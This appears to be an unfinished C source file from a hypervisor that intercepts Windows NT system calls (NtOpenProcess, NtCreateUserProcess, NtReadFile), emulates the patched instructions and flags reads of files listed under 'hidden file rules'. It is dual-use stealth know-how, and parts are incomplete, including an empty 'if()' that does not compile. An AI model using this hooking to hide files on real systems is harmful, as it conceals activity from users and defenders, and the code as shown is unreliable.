#include <win_kernel/syscall_handlers.h>
#include <win_kernel/memory_manager.h>
#include <debug.h>
#include <vmm/vmcs.h>
#include <vmm/vm_operations.h>
#include <win_kernel/kernel_objects.h>
#include <vmx_modules/syscalls_module.h>

static __attribute__((section(".nt_data"))) SYSCALL_DATA syscallsData[] = {  { NULL, 8 },  { NULL, 1 },  { NULL, 6 },  { NULL, 3 },  { NULL, 3 },  { NULL, 3 },  { NULL, 9 },  { NULL, 10 }, 
 { NULL, 9 },  { NULL, 5 },  { NULL, 3 },  { NULL, 4 },  { NULL, 2 },  { NULL, 4 },  { NULL, 2 },  { NULL, 1 }, 
 { NULL, 5 },  { NULL, 5 },  { NULL, 3 },  { NULL, 6 },  { NULL, 3 },  { NULL, 2 },  { NULL, 5 },  { NULL, 6 }, 
 { NULL, 6 },  { NULL, 5 },  { NULL, 5 },  { NULL, 9 },  { NULL, 4 },  { NULL, 7 },  { NULL, 4 },  { NULL, 2 }, 
 { NULL, 2 },  { NULL, 5 },  { NULL, 3 },  { NULL, 6 },  { NULL, 4 },  { NULL, 5 },  { NULL, 4 },  { NULL, 5 }, 
 { NULL, 10 },  { NULL, 11 },  { NULL, 2 },  { NULL, 5 },  { NULL, 2 },  { NULL, 1 },  { NULL, 9 },  { NULL, 5 }, 
 { NULL, 4 },  { NULL, 2 },  { NULL, 6 },  { NULL, 6 },  { NULL, 2 },  { NULL, 11 },  { NULL, 4 },  { NULL, 3 }, 
 { NULL, 5 },  { NULL, 10 },  { NULL, 5 },  { NULL, 3 },  { NULL, 7 },  { NULL, 2 },  { NULL, 1 },  { NULL, 5 }, 
 { NULL, 3 },  { NULL, 6 },  { NULL, 6 },  { NULL, 2 },  { NULL, 1 },  { NULL, 5 },  { NULL, 0 },  { NULL, 3 }, 
 { NULL, 5 },  { NULL, 5 },  { NULL, 7 },  { NULL, 2 },  { NULL, 2 },  { NULL, 9 },  { NULL, 8 },  { NULL, 2 }, 
 { NULL, 5 },  { NULL, 5 },  { NULL, 2 },  { NULL, 2 },  { NULL, 6 },  { NULL, 11 },  { NULL, 5 },  { NULL, 6 }, 
 { NULL, 3 },  { NULL, 16 },  { NULL, 1 },  { NULL, 5 },  { NULL, 4 },  { NULL, 2 },  { NULL, 4 },  { NULL, 5 }, 
 { NULL, 6 },  { NULL, 2 },  { NULL, 7 },  { NULL, 11 },  { NULL, 11 },  { NULL, 16 },  { NULL, 17 },  { NULL, 3 }, 
 { NULL, 4 },  { NULL, 2 },  { NULL, 2 },  { NULL, 6 },  { NULL, 16 },  { NULL, 2 },  { NULL, 1 },  { NULL, 1 }, 
 { NULL, 1 },  { NULL, 3 },  { NULL, 3 },  { NULL, 4 },  { NULL, 7 },  { NULL, 9 },  { NULL, 3 },  { NULL, 11 }, 
 { NULL, 11 },  { NULL, 3 },  { NULL, 6 },  { NULL, 4 },  { NULL, 3 },  { NULL, 3 },  { NULL, 3 },  { NULL, 3 }, 
 { NULL, 3 },  { NULL, 3 },  { NULL, 2 },  { NULL, 3 },  { NULL, 3 },  { NULL, 6 },  { NULL, 6 },  { NULL, 5 }, 
 { NULL, 6 },  { NULL, 3 },  { NULL, 8 },  { NULL, 4 },  { NULL, 2 },  { NULL, 2 },  { NULL, 8 },  { NULL, 4 }, 
 { NULL, 3 },  { NULL, 3 },  { NULL, 2 },  { NULL, 2 },  { NULL, 2 },  { NULL, 2 },  { NULL, 2 },  { NULL, 2 }, 
 { NULL, 2 },  { NULL, 2 },  { NULL, 2 },  { NULL, 3 },  { NULL, 1 },  { NULL, 1 },  { NULL, 8 },  { NULL, 4 }, 
 { NULL, 4 },  { NULL, 3 },  { NULL, 5 },  { NULL, 9 },  { NULL, 8 },  { NULL, 3 },  { NULL, 3 },  { NULL, 4 }, 
 { NULL, 3 },  { NULL, 3 },  { NULL, 8 },  { NULL, 4 },  { NULL, 9 },  { NULL, 8 },  { NULL, 4 },  { NULL, 14 }, 
 { NULL, 4 },  { NULL, 4 },  { NULL, 5 },  { NULL, 4 },  { NULL, 8 },  { NULL, 9 },  { NULL, 10 },  { NULL, 4 }, 
 { NULL, 7 },  { NULL, 5 },  { NULL, 4 },  { NULL, 11 },  { NULL, 4 },  { NULL, 5 },  { NULL, 13 },  { NULL, 17 }, 
 { NULL, 10 },  { NULL, 6 },  { NULL, 11 },  { NULL, 3 },  { NULL, 5 },  { NULL, 7 },  { NULL, 10 },  { NULL, 2 }, 
 { NULL, 3 },  { NULL, 1 },  { NULL, 1 },  { NULL, 1 },  { NULL, 1 },  { NULL, 1 },  { NULL, 3 },  { NULL, 1 }, 
 { NULL, 2 },  { NULL, 2 },  { NULL, 1 },  { NULL, 0 },  { NULL, 1 },  { NULL, 1 },  { NULL, 0 },  { NULL, 2 }, 
 { NULL, 2 },  { NULL, 3 },  { NULL, 5 },  { NULL, 2 },  { NULL, 5 },  { NULL, 6 },  { NULL, 14 },  { NULL, 5 }, 
 { NULL, 2 },  { NULL, 3 },  { NULL, 1 },  { NULL, 0 },  { NULL, 4 },  { NULL, 0 },  { NULL, 3 },  { NULL, 1 }, 
 { NULL, 2 },  { NULL, 6 },  { NULL, 6 },  { NULL, 2 },  { NULL, 0 },  { NULL, 1 },  { NULL, 2 },  { NULL, 3 }, 
 { NULL, 5 },  { NULL, 6 },  { NULL, 5 },  { NULL, 7 },  { NULL, 7 },  { NULL, 1 },  { NULL, 3 },  { NULL, 5 }, 
 { NULL, 3 },  { NULL, 1 },  { NULL, 4 },  { NULL, 0 },  { NULL, 0 },  { NULL, 2 },  { NULL, 1 },  { NULL, 9 }, 
 { NULL, 2 },  { NULL, 3 },  { NULL, 8 },  { NULL, 10 },  { NULL, 2 },  { NULL, 1 },  { NULL, 4 },  { NULL, 1 }, 
 { NULL, 1 },  { NULL, 5 },  { NULL, 6 },  { NULL, 3 },  { NULL, 9 },  { NULL, 1 },  { NULL, 1 },  { NULL, 9 }, 
 { NULL, 10 },  { NULL, 10 },  { NULL, 12 },  { NULL, 8 },  { NULL, 5 },  { NULL, 3 },  { NULL, 3 },  { NULL, 3 }, 
 { NULL, 4 },  { NULL, 4 },  { NULL, 5 },  { NULL, 3 },  { NULL, 3 },  { NULL, 12 },  { NULL, 3 },  { NULL, 4 }, 
 { NULL, 3 },  { NULL, 3 },  { NULL, 5 },  { NULL, 3 },  { NULL, 3 },  { NULL, 3 },  { NULL, 4 },  { NULL, 3 }, 
 { NULL, 5 },  { NULL, 6 },  { NULL, 3 },  { NULL, 2 },  { NULL, 2 },  { NULL, 2 },  { NULL, 2 },  { NULL, 3 }, 
 { NULL, 6 },  { NULL, 5 },  { NULL, 4 },  { NULL, 3 },  { NULL, 2 },  { NULL, 1 },  { NULL, 2 },  { NULL, 2 }, 
 { NULL, 2 },  { NULL, 10 },  { NULL, 7 },  { NULL, 2 },  { NULL, 9 },  { NULL, 2 },  { NULL, 5 },  { NULL, 5 }, 
 { NULL, 5 },  { NULL, 5 },  { NULL, 5 },  { NULL, 5 },  { NULL, 5 },  { NULL, 5 },  { NULL, 5 },  { NULL, 1 }, 
 { NULL, 2 },  { NULL, 5 },  { NULL, 5 },  { NULL, 6 },  { NULL, 5 },  { NULL, 2 },  { NULL, 4 },  { NULL, 0 }, 
 { NULL, 9 },  { NULL, 6 },  { NULL, 5 },  { NULL, 6 },  { NULL, 5 },  { NULL, 3 },  { NULL, 4 },  { NULL, 5 }, 
 { NULL, 6 },  { NULL, 3 },  { NULL, 6 },  { NULL, 5 },  { NULL, 6 },  { NULL, 3 },  { NULL, 6 },  { NULL, 2 }, 
 { NULL, 2 },  { NULL, 1 },  { NULL, 1 },  { NULL, 5 },  { NULL, 1 },  { NULL, 4 },  { NULL, 1 },  { NULL, 6 }, 
 { NULL, 2 },  { NULL, 2 },  { NULL, 2 },  { NULL, 3 },  { NULL, 3 },  { NULL, 2 },  { NULL, 2 },  { NULL, 2 }, 
 { NULL, 3 },  { NULL, 3 },  { NULL, 1 },  { NULL, 0 },  { NULL, 2 },  { NULL, 2 },  { NULL, 2 },  { NULL, 2 }, 
 { NULL, 2 },  { NULL, 2 },  { NULL, 3 },  { NULL, 3 },  { NULL, 9 },  { NULL, 0 },  { NULL, 2 },  { NULL, 2 }, 
 { NULL, 5 },  { NULL, 6 },  { NULL, 2 },  { NULL, 3 },  { NULL, 1 },  { NULL, 2 },  { NULL, 1 },  { NULL, 2 }, 
 { NULL, 4 },  { NULL, 1 },  { NULL, 1 },  { NULL, 2 },  { NULL, 5 },  { NULL, 4 },  { NULL, 4 },  { NULL, 4 }, 
 { NULL, 4 },  { NULL, 4 },  { NULL, 4 },  { NULL, 4 },  { NULL, 4 },  { NULL, 6 },  { NULL, 4 },  { NULL, 2 }, 
 { NULL, 5 },  { NULL, 6 },  { NULL, 6 },  { NULL, 1 },  { NULL, 1 },  { NULL, 4 },  { NULL, 3 },  { NULL, 2 }, 
 { NULL, 5 },  { NULL, 3 },  { NULL, 3 },  { NULL, 2 },  { NULL, 2 },  { NULL, 4 },  { NULL, 4 },  { NULL, 3 }, 
 { NULL, 1 },  { NULL, 5 },  { NULL, 1 },  { NULL, 1 },  { NULL, 2 },  { NULL, 4 },  { NULL, 2 },  { NULL, 1 }, 
 { NULL, 1 },  { NULL, 4 },  { NULL, 1 },  { NULL, 2 },  { NULL, 6 },  { NULL, 2 },  { NULL, 2 },  { NULL, 0 }, 
 { NULL, 0 },  { NULL, 0 },  { NULL, 6 },  { NULL, 4 },  { NULL, 1 },  { NULL, 1 },  { NULL, 1 },  { NULL, 2 }, 
 { NULL, 2 },  { NULL, 5 },  { NULL, 4 },  { NULL, 3 },  { NULL, 1 },  { NULL, 7 },  { NULL, 2 },  { NULL, 2 }, 
 { NULL, 4 },  { NULL, 4 },  { NULL, 5 },  { NULL, 1 },  { NULL, 1 } };

VOID InitSyscallData(IN QWORD syscallId, IN BYTE hookInstructionOffset, IN BYTE hookedInstructionLength,
    IN SYSCALL_HANDLER handler, IN BOOL hookReturn, IN SYSCALL_HANDLER returnHandler)
{
    syscallsData[syscallId].hookInstructionOffset = hookInstructionOffset;
    syscallsData[syscallId].hookedInstructionLength = hookedInstructionLength;
    syscallsData[syscallId].hookReturnEvent = hookReturn;
    syscallsData[syscallId].handler = handler;
    syscallsData[syscallId].returnHandler = returnHandler;
}

VOID GetParameters(OUT QWORD_PTR params, IN BYTE count)
{
    PREGISTERS regs = &GetVMMStruct()->guestRegisters;
    QWORD paramsStart = regs->rsp + 4 * sizeof(QWORD);
    switch(count)
    {
        case 17:
        case 16:
        case 15:
        case 14:
        case 13:
        case 12:
        case 11:
        case 10:
        case 9:
        case 8:
        case 7:
        case 6:
        case 5:
            CopyGuestMemory(params + 4, paramsStart, (count - 4) * sizeof(QWORD));
        case 4:
            params[3] = regs->r9;
        case 3:
            params[2] = regs->r8;
        case 2:
            params[1] = regs->rdx;
        case 1:
            params[0] = regs->rcx;
    }
}

VOID HookReturnEvent(IN QWORD syscallId, IN QWORD rsp, OUT QWORD_PTR realReturnAddress)
{
    QWORD returnAddress = CALC_RETURN_HOOK_ADDR(syscallsData[syscallId].virtualHookedInstructionAddress);
    CopyGuestMemory(realReturnAddress, rsp, sizeof(QWORD));
    CopyMemoryToGuest(rsp, &returnAddress, sizeof(QWORD));
}

VOID SaveReturnAddress(IN QWORD returnAddress)
{
    // Need to create a DB that contains thread IDs
    QWORD ethread, threadId;
    GetCurrent_ETHREAD(&ethread);
    if()
}

STATUS HandleNtOpenPrcoess()
{
    PCURRENT_GUEST_STATE state = GetVMMStruct();
    PSHARED_CPU_DATA shared = state->currentCPU->sharedData;
    PREGISTERS regs = &state->guestRegisters;
    // Emulate replaced instruction: sub rsp,38h
    regs->rsp -= 0x38;
    regs->rip += syscallsData[NT_OPEN_PROCESS].hookedInstructionLength;
    // End emulation
    return STATUS_SUCCESS;
}

STATUS HandleNtOpenPrcoessReturn()
{
    PCURRENT_GUEST_STATE state = GetVMMStruct();
    PSHARED_CPU_DATA shared = state->currentCPU->sharedData;
    PREGISTERS regs = &state->guestRegisters;
    return STATUS_SUCCESS;
}

STATUS HandleNtCreateUserProcess()
{
    PCURRENT_GUEST_STATE state = GetVMMStruct();
    PSHARED_CPU_DATA shared = state->currentCPU->sharedData;
    PREGISTERS regs = &state->guestRegisters;
    // Emulate replaced instruction: push rbp
    ASSERT(CopyMemoryToGuest(regs->rsp - 8, &regs->rbp, sizeof(QWORD)) == STATUS_SUCCESS);
    regs->rsp -= 8;
    regs->rip += syscallsData[NT_CREATE_USER_PROCESS].hookedInstructionLength;
    // End emulation
    return STATUS_SUCCESS;
}

STATUS HandleNtReadFile()
{
    static PMODULE module = NULL;
    PCURRENT_GUEST_STATE state = GetVMMStruct();
    PSHARED_CPU_DATA shared = state->currentCPU->sharedData;
    PREGISTERS regs = &state->guestRegisters;
    // First get the syscalls module pointer
    if(!module)
    {
        STATUS status;
        if((status = GetModuleByName(&module, "Windows System Calls Module")) != STATUS_SUCCESS)
        {
            Print("Could not find the desired module\n");
            return status;
        }
    }
    PSYSCALLS_MODULE_EXTENSION ext = module->moduleExtension;
    PQWORD_MAP filesData = &ext->filesData;
    // Receive syscall parameters
    QWORD params[17];
    GetParameters(params, syscallsData[NT_READ_FILE].params);
    // Translate the first parameter (file handle) to the corresponding _FILE_OBJECT structure
    QWORD fileObject, handleTable, eprocess;
    GetCurrent_EPROCESS(&eprocess);
    GetObjectField(EPROCESS, eprocess, EPROCESS_OBJECT_TABLE, &handleTable);
    if(TranslateHandleToObject(params[0], handleTable, &fileObject) != STATUS_SUCCESS)
    {
        Print("Could not translate handle to object, skipping...\n");
        return STATUS_SUCCESS;
    }
    // Check if the current path is a protected file
    WIN_KERNEL_UNICODE_STRING filePath;
    if(GetObjectField(FILE_OBJECT, fileObject, FILE_OBJECT_FILE_NAME, &filePath) != STATUS_SUCCESS)
    {
        Print("Could not get the file path using the FILE_OBJECT structure, skipping...\n");
        return STATUS_SUCCESS;
    }
    BYTE path[BUFF_MAX_SIZE];
    if(CopyGuestMemory(path, filePath.address, filePath.length) != STATUS_SUCCESS)
    {
        Print("Could not copy the path of the current file, skipping...\n");
        return STATUS_SUCCESS;
    }
    UNICODE_STRING str;
    PHIDDEN_FILE_RULE hiddenFileRule;
    str.data = path;
    str.length = filePath.length;
    if((hiddenFileRule = MapGet(filesData, &str)) != MAP_KEY_NOT_FOUND)
    {
        QWORD returnAddress;
        // The file is a protected file
        HookReturnEvent(NT_READ_FILE, regs->rsp, &returnAddress);
        SaveReturnAddress(returnAddress);
    }
    // Emulate replaced instruction: mov rax,rsp
    regs->rax = regs->rsp;
    // End emulation
    return STATUS_SUCCESS;
}

STATUS HandleNtReadFileReturn()
{
    return STATUS_SUCCESS;
}